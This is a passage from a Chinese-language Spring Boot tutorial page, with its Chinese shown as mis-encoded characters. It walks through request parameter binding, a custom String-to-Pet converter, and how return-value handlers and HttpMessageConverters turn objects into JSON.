class="hljs-title class_">ParameterTestController</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ•°æ®ç»‘å®šï¼šé¡µé¢æäº¤çš„è¯·æ±‚æ•°æ®ï¼ˆGETã€POSTï¼‰éƒ½å¯ä»¥å’Œå¯¹è±¡å±æ€§è¿›è¡Œç»‘å®š</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> person</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@PostMapping(&quot;/saveuser&quot;)</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">saveuser</span><span class="hljs-params">(Person person)</span>&#123;<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *     å§“åï¼š &lt;input name=&quot;userName&quot;/&gt; &lt;br/&gt;</span><br><span class="hljs-comment"> *     å¹´é¾„ï¼š &lt;input name=&quot;age&quot;/&gt; &lt;br/&gt;</span><br><span class="hljs-comment"> *     ç”Ÿæ—¥ï¼š &lt;input name=&quot;birth&quot;/&gt; &lt;br/&gt;</span><br><span class="hljs-comment"> *     å® ç‰©å§“åï¼š&lt;input name=&quot;pet.name&quot;/&gt;&lt;br/&gt;</span><br><span class="hljs-comment"> *     å® ç‰©å¹´é¾„ï¼š&lt;input name=&quot;pet.age&quot;/&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> String userName;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Pet pet;<br>    <br>&#125;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String age;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>å°è£…è¿‡ç¨‹ç”¨åˆ°<code>ServletModelAttributeMethodProcessor</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ModelAttributeMethodProcessor</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><span class="hljs-comment">//æœ¬æ–¹æ³•åœ¨ModelAttributeMethodProcessorç±»ï¼Œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-keyword">return</span> (parameter.hasParameterAnnotation(ModelAttribute.class) ||<br>(<span class="hljs-built_in">this</span>.annotationNotRequired &amp;&amp; !BeanUtils.isSimpleProperty(parameter.getParameterType())));<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><span class="hljs-comment">//æœ¬æ–¹æ³•åœ¨ModelAttributeMethodProcessorç±»ï¼Œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>...<br><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ModelFactory.getNameForParameter(parameter);<br><span class="hljs-type">ModelAttribute</span> <span class="hljs-variable">ann</span> <span class="hljs-operator">=</span> parameter.getParameterAnnotation(ModelAttribute.class);<br><span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) &#123;<br>mavContainer.setBinding(name, ann.binding());<br>&#125;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">attribute</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">BindingResult</span> <span class="hljs-variable">bindingResult</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span> (mavContainer.containsAttribute(name)) &#123;<br>attribute = mavContainer.getModel().get(name);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Create attribute instance</span><br><span class="hljs-keyword">try</span> &#123;<br>attribute = createAttribute(name, parameter, binderFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (BindException ex) &#123;<br>...<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (bindingResult == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">// Bean property binding and validation;</span><br><span class="hljs-comment">// skipped in case of binding failure on construction.</span><br><span class="hljs-type">WebDataBinder</span> <span class="hljs-variable">binder</span> <span class="hljs-operator">=</span> binderFactory.createBinder(webRequest, attribute, name);<br><span class="hljs-keyword">if</span> (binder.getTarget() != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (!mavContainer.isBindingDisabled(name)) &#123;<br>                    <span class="hljs-comment">//webæ•°æ®ç»‘å®šå™¨ï¼Œå°†è¯·æ±‚å‚æ•°çš„å€¼ç»‘å®šåˆ°æŒ‡å®šçš„JavaBeané‡Œé¢**</span><br>bindRequestParameters(binder, webRequest);<br>&#125;<br>validateIfApplicable(binder, parameter);<br><span class="hljs-keyword">if</span> (binder.getBindingResult().hasErrors() &amp;&amp; isBindExceptionRequired(binder, parameter)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BindException</span>(binder.getBindingResult());<br>&#125;<br>&#125;<br><span class="hljs-comment">// Value type adaptation, also covering java.util.Optional</span><br><span class="hljs-keyword">if</span> (!parameter.getParameterType().isInstance(attribute)) &#123;<br>attribute = binder.convertIfNecessary(binder.getTarget(), parameter.getParameterType(), parameter);<br>&#125;<br>bindingResult = binder.getBindingResult();<br>&#125;<br><br><span class="hljs-comment">// Add resolved attribute and BindingResult at the end of the model</span><br>Map&lt;String, Object&gt; bindingResultModel = bindingResult.getModel();<br>mavContainer.removeAttributes(bindingResultModel);<br>mavContainer.addAllAttributes(bindingResultModel);<br><br><span class="hljs-keyword">return</span> attribute;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>WebDataBinder åˆ©ç”¨å®ƒé‡Œé¢çš„ Converters å°†è¯·æ±‚æ•°æ®è½¬æˆæŒ‡å®šçš„æ•°æ®ç±»å‹ã€‚å†æ¬¡å°è£…åˆ°JavaBeanä¸­</strong></p><p><strong>åœ¨è¿‡ç¨‹å½“ä¸­ï¼Œç”¨åˆ°GenericConversionServiceï¼šåœ¨è®¾ç½®æ¯ä¸€ä¸ªå€¼çš„æ—¶å€™ï¼Œæ‰¾å®ƒé‡Œé¢çš„æ‰€æœ‰converteré‚£ä¸ªå¯ä»¥å°†è¿™ä¸ªæ•°æ®ç±»å‹ï¼ˆrequestå¸¦æ¥å‚æ•°çš„å­—ç¬¦ä¸²ï¼‰è½¬æ¢åˆ°æŒ‡å®šçš„ç±»å‹</strong></p><h2 id="36ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰ConverteråŸç†"><a href="#36ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰ConverteråŸç†" class="headerlink" title="36ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰ConverteråŸç†"></a>36ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰ConverteråŸç†</h2><p>æœªæ¥æˆ‘ä»¬å¯ä»¥ç»™WebDataBinderé‡Œé¢æ”¾è‡ªå·±çš„Converterï¼›</p><p>ä¸‹é¢æ¼”ç¤ºå°†å­—ç¬¦ä¸²<code>â€œå•ŠçŒ«,3â€</code>è½¬æ¢æˆ<code>Pet</code>å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1ã€WebMvcConfigurerå®šåˆ¶åŒ–SpringMVCçš„åŠŸèƒ½</span><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFormatters</span><span class="hljs-params">(FormatterRegistry registry)</span> &#123;<br>            registry.addConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Converter</span>&lt;String, Pet&gt;() &#123;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> Pet <span class="hljs-title function_">convert</span><span class="hljs-params">(String source)</span> &#123;<br>                    <span class="hljs-comment">// å•ŠçŒ«,3</span><br>                    <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(source))&#123;<br>                        <span class="hljs-type">Pet</span> <span class="hljs-variable">pet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pet</span>();<br>                        String[] split = source.split(<span class="hljs-string">&quot;,&quot;</span>);<br>                        pet.setName(split[<span class="hljs-number">0</span>]);<br>                        pet.setAge(Integer.parseInt(split[<span class="hljs-number">1</span>]));<br>                        <span class="hljs-keyword">return</span> pet;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="37ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-ReturnValueHandleråŸç†"><a href="#37ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-ReturnValueHandleråŸç†" class="headerlink" title="37ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-ReturnValueHandleråŸç†"></a>37ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-ReturnValueHandleråŸç†</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205010403920.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‡è®¾ç»™å‰ç«¯è‡ªåŠ¨è¿”å›jsonæ•°æ®ï¼Œéœ€è¦å¼•å…¥ç›¸å…³çš„ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- webåœºæ™¯è‡ªåŠ¨å¼•å…¥äº†jsonåœºæ™¯ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-json<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ§åˆ¶å±‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseTestController</span> &#123;<br>    <br><span class="hljs-meta">@ResponseBody</span>  <span class="hljs-comment">//åˆ©ç”¨è¿”å›å€¼å¤„ç†å™¨é‡Œé¢çš„æ¶ˆæ¯è½¬æ¢å™¨è¿›è¡Œå¤„ç†</span><br>    <span class="hljs-meta">@GetMapping(value = &quot;/test/person&quot;)</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">getPerson</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">28</span>);<br>        person.setBirth(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>        person.setUserName(<span class="hljs-string">&quot;zhangsan&quot;</span>);<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><a href="#">32ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-å„ç§ç±»å‹å‚æ•°è§£æåŸç† - è¿”å›å€¼å¤„ç†å™¨</a>æœ‰è®¨è®º<strong>ReturnValueHandler</strong>ã€‚ç°åœ¨ç›´æ¥çœ‹çœ‹é‡ç‚¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br>    ...<br>    <br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br><span class="hljs-keyword">try</span> &#123;<br><br>            ...<br>            <br>            <span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br>                <br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<br>invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//&lt;----å…³æ³¨ç‚¹</span><br>invocableMethod.setHandlerMethodReturnValueHandlers(<span class="hljs-built_in">this</span>.returnValueHandlers);<br>&#125;<br><br>            ...<br><br>invocableMethod.invokeAndHandle(webRequest, mavContainer);<span class="hljs-comment">//çœ‹ä¸‹å—ä»£ç </span><br><span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>webRequest.requestCompleted();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletInvocableHandlerMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InvocableHandlerMethod</span> &#123;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br><br>        ...<br>        <br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//çœ‹ä¸‹å—ä»£ç </span><br><span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>...<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerMethodReturnValueHandlerComposite</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType,</span><br><span class="hljs-params">ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//selectHandler()å®ç°åœ¨ä¸‹é¢</span><br><span class="hljs-type">HandlerMethodReturnValueHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> selectHandler(returnValue, returnType);<br><span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unknown return value type: &quot;</span> + returnType.getParameterType().getName());<br>&#125;<br>        <span class="hljs-comment">//å¼€å§‹å¤„ç†</span><br>handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);<br>&#125;<br>    <br>   <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodReturnValueHandler <span class="hljs-title function_">selectHandler</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object value, MethodParameter returnType)</span> &#123;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isAsyncValue</span> <span class="hljs-operator">=</span> isAsyncReturnValue(value, returnType);<br><span class="hljs-keyword">for</span> (HandlerMethodReturnValueHandler handler : <span class="hljs-built_in">this</span>.returnValueHandlers) &#123;<br><span class="hljs-keyword">if</span> (isAsyncValue &amp;&amp; !(handler <span class="hljs-keyword">instanceof</span> AsyncHandlerMethodReturnValueHandler)) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (handler.supportsReturnType(returnType)) &#123;<br><span class="hljs-keyword">return</span> handler;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p><code>@ResponseBody</code> æ³¨è§£ï¼Œå³<code>RequestResponseBodyMethodProcessor</code>ï¼Œå®ƒå®ç°<code>HandlerMethodReturnValueHandler</code>æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestResponseBodyMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodProcessor</span> &#123;<br><br>    ...<br>    <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType,</span><br><span class="hljs-params">ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span><br><span class="hljs-keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException &#123;<br><br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ServletServerHttpRequest</span> <span class="hljs-variable">inputMessage</span> <span class="hljs-operator">=</span> createInputMessage(webRequest);<br><span class="hljs-type">ServletServerHttpResponse</span> <span class="hljs-variable">outputMessage</span> <span class="hljs-operator">=</span> createOutputMessage(webRequest);<br><br>        <span class="hljs-comment">// ä½¿ç”¨æ¶ˆæ¯è½¬æ¢å™¨è¿›è¡Œå†™å‡ºæ“ä½œï¼Œæœ¬æ–¹æ³•ä¸‹ä¸€ç« èŠ‚ä»‹ç»ï¼š</span><br><span class="hljs-comment">// Try even with null return value. ResponseBodyAdvice could get involved.</span><br>writeWithMessageConverters(returnValue, returnType, inputMessage, outputMessage);<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="38ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-HTTPMessageConverteråŸç†"><a href="#38ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-HTTPMessageConverteråŸç†" class="headerlink" title="38ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-HTTPMessageConverteråŸç†"></a>38ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-HTTPMessageConverteråŸç†</h2><p>è¿”å›å€¼å¤„ç†å™¨<code>ReturnValueHandler</code>åŸç†ï¼š</p><ol><li>è¿”å›å€¼å¤„ç†å™¨åˆ¤æ–­æ˜¯å¦æ”¯æŒè¿™ç§ç±»å‹è¿”å›å€¼ <code>supportsReturnType</code></li><li>è¿”å›å€¼å¤„ç†å™¨è°ƒç”¨ <code>handleReturnValue</code> è¿›è¡Œå¤„ç†</li><li><code>RequestResponseBodyMethodProcessor</code> å¯ä»¥å¤„ç†è¿”å›å€¼æ ‡äº†<code>@ResponseBody</code> æ³¨è§£çš„ã€‚<ul><li>åˆ©ç”¨ <code>MessageConverters</code> è¿›è¡Œå¤„ç† å°†æ•°æ®å†™ä¸ºjson<ol><li>å†…å®¹åå•†ï¼ˆæµè§ˆå™¨é»˜è®¤ä¼šä»¥è¯·æ±‚å¤´çš„æ–¹å¼å‘Šè¯‰æœåŠ¡å™¨ä»–èƒ½æ¥å—ä»€ä¹ˆæ ·çš„å†…å®¹ç±»å‹ï¼‰</li><li>æœåŠ¡å™¨æœ€ç»ˆæ ¹æ®è‡ªå·±è‡ªèº«çš„èƒ½åŠ›ï¼Œå†³å®šæœåŠ¡å™¨èƒ½ç”Ÿäº§å‡ºä»€ä¹ˆæ ·å†…å®¹ç±»å‹çš„æ•°æ®ï¼Œ</li><li>SpringMVCä¼šæŒ¨ä¸ªéå†æ‰€æœ‰å®¹å™¨åº•å±‚çš„ <code>HttpMessageConverter</code> ï¼Œçœ‹è°èƒ½å¤„ç†ï¼Ÿ<ol><li>å¾—åˆ°<code>MappingJackson2HttpMessageConverter</code>å¯ä»¥å°†å¯¹è±¡å†™ä¸ºjson</li><li>åˆ©ç”¨<code>MappingJackson2HttpMessageConverter</code>å°†å¯¹è±¡è½¬ä¸ºjsonå†å†™å‡ºå»ã€‚</li></ol></li></ol></li></ul></li></ol><figure class="highlight 